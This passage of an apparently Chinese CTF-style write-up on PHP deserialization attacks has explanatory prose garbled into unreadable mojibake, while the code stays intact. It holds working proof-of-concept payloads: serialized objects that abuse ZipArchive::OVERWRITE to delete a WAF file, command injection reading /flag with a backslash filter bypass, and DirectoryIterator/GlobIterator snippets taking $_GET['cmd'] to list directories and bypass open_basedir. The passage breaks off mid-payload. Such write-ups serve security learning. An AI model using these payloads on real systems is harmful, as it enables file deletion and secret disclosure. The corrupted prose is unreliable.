</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ‰¾åˆ°äº†<code>ZipArchive::open</code></p>
<p>å¦‚æœè®¾ç½®flagså‚æ•°çš„å€¼ä¸º <code>ZipArchive::OVERWRITE</code> çš„è¯ï¼Œå¯ä»¥æŠŠæŒ‡å®šæ–‡ä»¶åˆ é™¤ã€‚è¿™é‡Œæˆ‘ä»¬è·Ÿè¿›æ–¹æ³•å¯ä»¥çœ‹åˆ°const OVERWRITE = 8ï¼Œä¹Ÿå°±æ˜¯å°†OVERWRITEå®šä¹‰ä¸ºäº†å¸¸é‡8ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨æ—¶ä¹Ÿå¯ä»¥ç›´æ¥å°†flagsèµ‹å€¼ä¸º8ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">ZipArchive</span>::<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>, <span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>)</span><br></pre></td></tr></table></figure>
<p>åˆ é™¤waf.txtçš„POC</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;    <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$poc</span> = <span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;password = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;register = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;file = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;filename = <span class="string">&quot;waf.txt&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;content = <span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>;<span class="comment">//æˆ–è€…ä¸º8</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure>
<p>åˆ é™¤åï¼Œæˆ‘ä»¬ç›´æ¥æ„é€ å‘½ä»¤æ‰§è¡Œï¼Œä¹Ÿéœ€è¦ç»•è¿‡æ­£åˆ™</p>
<p>æˆ‘ä»¬è¿™ç§åªéœ€è¦ç”¨<code>''</code>æˆ–è€…<code>\</code>æ¥è¿‡æ»¤å³å¯</p>
<p>POC</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$poc</span> = <span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;password = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;register = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;file = <span class="keyword">new</span> <span class="title class_">Open</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;filename = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;content = <span class="string">&quot;n\l /flag&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure>
<h4 id="php-åŸç”Ÿæ–‡ä»¶æ“ä½œç±»"><a class="markdownIt-Anchor" href="#php-åŸç”Ÿæ–‡ä»¶æ“ä½œç±»"></a> PHP åŸç”Ÿæ–‡ä»¶æ“ä½œç±»</h4>
<h5 id="spl"><a class="markdownIt-Anchor" href="#spl"></a> SPL</h5>
<p>SPLæ˜¯phpæ ‡å‡†åº“</p>
<p><a href="https://www.php.net/manual/zh/book.spl.php">PHP: SPL - Manual</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SPL å¯¹ PHP å¼•æ“è¿›è¡Œäº†æ‰©å±•ï¼Œä¾‹å¦‚ <span class="built_in">ArrayAccess</span>ã€<span class="built_in">Countable</span> å’Œ <span class="built_in">SeekableIterator</span> ç­‰æ¥å£ï¼Œå®ƒä»¬ç”¨äºä»¥æ•°ç»„å½¢å¼æ“ä½œå¯¹è±¡ã€‚åŒæ—¶ï¼Œä½ è¿˜å¯ä»¥ä½¿ç”¨ <span class="built_in">RecursiveIterator</span>ã€ArrayObejcts ç­‰å…¶ä»–è¿­ä»£å™¨è¿›è¡Œæ•°æ®çš„è¿­ä»£æ“ä½œã€‚å®ƒè¿˜å†…ç½®å‡ ä¸ªçš„å¯¹è±¡ä¾‹å¦‚ Exceptionsã€<span class="built_in">SplObserver</span>ã€Spltorage ä»¥åŠ splautoloadregisterã€splclassesã€iteratorapply ç­‰çš„å¸®åŠ©å‡½æ•°ï¼ˆhelper functionsï¼‰ï¼Œç”¨äºé‡è½½å¯¹åº”çš„åŠŸèƒ½ã€‚è¿™äº›å·¥å…·èšåˆåœ¨ä¸€èµ·å°±å¥½æ¯”æ˜¯æŠŠå¤šåŠŸèƒ½çš„ç‘å£«å†›åˆ€ï¼Œå–„ç”¨å®ƒä»¬å¯ä»¥ä»è´¨ä¸Šæå‡ PHP çš„ä»£ç æ•ˆç‡</span><br></pre></td></tr></table></figure>
<h5 id="éå†æ–‡ä»¶ç›®å½•çš„ç±»"><a class="markdownIt-Anchor" href="#éå†æ–‡ä»¶ç›®å½•çš„ç±»"></a> éå†æ–‡ä»¶ç›®å½•çš„ç±»</h5>
<ul>
<li>DirectoryIterator ç±»</li>
<li>FilesystemIterator ç±»</li>
<li>GlobIterator ç±»</li>
</ul>
<h5 id="directoryiterator-ç±»"><a class="markdownIt-Anchor" href="#directoryiterator-ç±»"></a> DirectoryIterator ç±»</h5>
<p>ç±»ä»‹ç»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">DirectoryIterator</span> <span class="keyword">extends</span> <span class="built_in">SplFileInfo</span> <span class="keyword">implements</span> <span class="built_in">SeekableIterator</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* æ–¹æ³• */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$path</span> )</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">current</span> ( ) : <span class="built_in">DirectoryIterator</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getATime</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getBasename</span> ( <span class="keyword">string</span> <span class="variable">$suffix</span> = ? ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getCTime</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getExtension</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getFilename</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getGroup</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getInode</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getMTime</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getOwner</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getPath</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getPathname</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getPerms</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getSize</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">getType</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isDir</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isDot</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isExecutable</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isFile</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isLink</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isReadable</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">isWritable</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">key</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">next</span> ( ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">rewind</span> ( ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">seek</span> ( <span class="keyword">int</span> <span class="variable">$position</span> ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span>    <span class="comment">// ä»¥å­—ç¬¦ä¸²å½¢å¼è·å–æ–‡ä»¶å</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">valid</span> ( ) : <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨ã€‚å½“æ‰§è¡Œåˆ°echoå‡½æ•°æ—¶ï¼Œä¼šè§¦å‘DirectoryIteratorç±»ä¸­çš„ <code>__toString()</code> æ–¹æ³•ï¼Œè¾“å‡ºæŒ‡å®šç›®å½•é‡Œé¢ç»è¿‡æ’åºä¹‹åçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶å</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure>
<p>éå†æ–‡ä»¶ç›®å½•,ç›´æ¥å¯¹æ–‡ä»¶å…¨éƒ¨è¾“å‡ºå‡ºæ¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    <span class="comment">//echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå¯ä»¥é…åˆglob://åè®®ä½¿ç”¨æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶è·¯å¾„ï¼š</p>
<blockquote>
<p>glob:// åè®®ç”¨æ¥æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///flag&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure>
<h5 id="filesystemiterator-ç±»"><a class="markdownIt-Anchor" href="#filesystemiterator-ç±»"></a> FilesystemIterator ç±»</h5>
<p>FilesystemIterator ç±»ä¸ DirectoryIterator ç±»ç›¸åŒï¼Œæä¾›äº†ä¸€ä¸ªç”¨äºæŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç›®å½•å†…å®¹çš„ç®€å•æ¥å£ã€‚è¯¥ç±»çš„æ„é€ æ–¹æ³•å°†ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨ã€‚</p>
<p>éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬å°±åˆ—ä¸¾ä¸€ä¸ª</p>
<p>æµ‹è¯•ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    <span class="comment">//echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥å¯¹æ–‡ä»¶ç›®å½•å…¨éƒ¨è¾“å‡ºå‡ºæ¥ã€‚</p>
<h5 id="globiteratorç±»"><a class="markdownIt-Anchor" href="#globiteratorç±»"></a> GlobIteratorç±»</h5>
<p>GlobIterator ç±»ä¹Ÿå¯ä»¥éå†ä¸€ä¸ªæ–‡ä»¶ç›®å½•ï¼Œä½¿ç”¨æ–¹æ³•ä¸å‰ä¸¤ä¸ªç±»ä¹ŸåŸºæœ¬ç›¸ä¼¼ã€‚ä½†ä¸ä¸Šé¢ç•¥ä¸åŒçš„æ˜¯å…¶è¡Œä¸ºç±»ä¼¼äº glob()ï¼Œå¯ä»¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„</p>
<p>ç±»ä»‹ç»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">GlobIterator</span> <span class="keyword">extends</span> <span class="built_in">FilesystemIterator</span> <span class="keyword">implements</span> <span class="built_in">SeekableIterator</span> , <span class="built_in">Countable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* æ–¹æ³• */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$pattern</span> , <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">KEY_AS_PATHNAME</span> | <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">CURRENT_AS_FILEINFO</span> )</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">count</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="comment">/* ç»§æ‰¿çš„æ–¹æ³• */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">__construct</span> ( <span class="keyword">string</span> <span class="variable">$path</span> , <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">KEY_AS_PATHNAME</span> | <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">CURRENT_AS_FILEINFO</span> | <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">SKIP_DOTS</span> )</span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">current</span> ( ) : <span class="keyword">mixed</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">getFlags</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">key</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">next</span> ( ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">rewind</span> ( ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">setFlags</span> ( <span class="keyword">int</span> <span class="variable">$flags</span> = ? ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å½“æˆ‘ä»¬ä½¿ç”¨ DirectoryIterator ç±»å’Œ FilesystemIterator ç±»ä¸”æ²¡æœ‰é…åˆglob://åè®®è¿›è¡ŒåŒ¹é…çš„æ—¶å€™ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure>
<p>å…¶æ„é€ å‡½æ•°åˆ›å»ºçš„æ˜¯ä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨echoå‡½æ•°è¾“å‡ºçš„æ—¶å€™ï¼Œä¼šè§¦å‘è¿™ä¸¤ä¸ªç±»ä¸­çš„ <code>__toString()</code> æ–¹æ³•ï¼Œè¾“å‡ºæŒ‡å®šç›®å½•é‡Œé¢ç‰¹å®šæ’åºä¹‹åçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶åã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬ä¸å¾ªç¯éå†çš„è¯æ˜¯ä¸èƒ½çœ‹åˆ°æŒ‡å®šç›®å½•é‡Œçš„å…¨éƒ¨æ–‡ä»¶çš„ï¼Œè€Œ GlobIterator ç±»ä¾¿å¯ä»¥å¸®æˆ‘ä»¬åœ¨ä¸€å®šç¨‹åº¦ä¸Šè§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚ç”±äº GlobIterator ç±»æ”¯æŒç›´æ¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„ï¼Œä¹Ÿå°±æ˜¯è¯´å‡è®¾æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªæ–‡ä»¶åçš„ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥ç±»çš„æ¨¡å¼åŒ¹é…æ‰¾åˆ°å…¶å®Œæ•´çš„æ–‡ä»¶åã€‚</p>
<p>æ„æ€å°±æ˜¯æˆ‘ä»¬å¯ä»¥åœ¨<code>GlobIterator</code>ä¸­ç›´æ¥ä½¿ç”¨æ­£åˆ™åŒ¹é…è·¯å¾„æ¥éå†ç›®å½•</p>
<p>éå†ç›®å½•å…¨éƒ¨æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);<span class="comment">// ä¸åŠ __toString()ä¹Ÿå¯,å› ä¸ºechoå¯ä»¥è‡ªåŠ¨è°ƒç”¨</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="ä½¿ç”¨å¯éå†ç›®å½•ç±»ç»•è¿‡-open_basedir"><a class="markdownIt-Anchor" href="#ä½¿ç”¨å¯éå†ç›®å½•ç±»ç»•è¿‡-open_basedir"></a> ä½¿ç”¨å¯éå†ç›®å½•ç±»ç»•è¿‡ open_basedir</h5>
<p>å…³äºç»•è¿‡open_basedir()å¯ä»¥çœ‹çœ‹<a href="https://blog.csdn.net/Xxy605/article/details/120221577">è¿™ä¸ªæ–‡ç« </a></p>
<h5 id="ä½¿ç”¨directoryiteratorç±»"><a class="markdownIt-Anchor" href="#ä½¿ç”¨directoryiteratorç±»"></a> ä½¿ç”¨DirectoryIteratorç±»</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);<span class="comment">// ä¸åŠ __toString()ä¹Ÿå¯,å› ä¸ºechoå¯ä»¥è‡ªåŠ¨è°ƒç”¨</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">å…¶ä¸­cmd=glob:<span class="comment">///*</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payloadä¸€å¥è¯çš„å½¢å¼:</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span 